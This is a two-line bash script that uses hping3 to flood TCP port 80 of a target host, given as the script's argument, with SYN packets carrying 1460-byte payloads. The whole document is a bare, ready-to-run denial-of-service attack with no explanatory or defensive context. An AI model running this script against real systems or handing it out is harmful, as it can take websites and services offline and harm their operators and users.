#!/bin/bash
hping3 -S -p 80 --flood -d 1460 $1
